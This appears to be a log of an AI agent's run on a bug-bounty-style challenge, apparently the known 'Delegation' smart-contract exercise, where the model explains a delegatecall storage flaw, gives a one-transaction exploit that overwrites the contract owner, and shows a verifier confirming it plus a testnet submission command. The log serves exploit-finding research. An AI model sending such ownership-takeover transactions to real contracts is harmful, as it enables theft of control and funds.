# Hunter agent run — delegation — muse-wonder-1.0-low (cmd) — 2026-11-01

## Turn 1 — model reply (verbatim)

The bug is `Delegation`'s fallback forwards arbitrary calldata via `delegatecall` to `Delegate`, so delegated code runs in `Delegation`'s storage context. Calling `pwn()` through the fallback executes `Delegate.pwn()` against `Delegation`'s storage, overwriting its `owner` slot (slot 0) with `msg.sender`, the player.

```json
[
  {"to": "0x1780ddd8723ddc88d5def27cc1dfb16a73077434", "data": "0xdd365b8b", "value": "0"}
]
```

### Turn 1 — local verifier (committed verifier.wasm, wasmtime)

```
tx 1: success
validateInstance → 1
broken: True
```

**Result: invariant broken on turn 1.**

Next step on testnet (needs a funded hunter account and an open bounty on this invariant):
`python3 scripts/hunter.py --bounty <bounty> --hunter <account> --exploit hunter-agent/delegation-muse-wonder-1.0-low-exploit.json --label agent-delegation --invariant delegation-owner-taken`
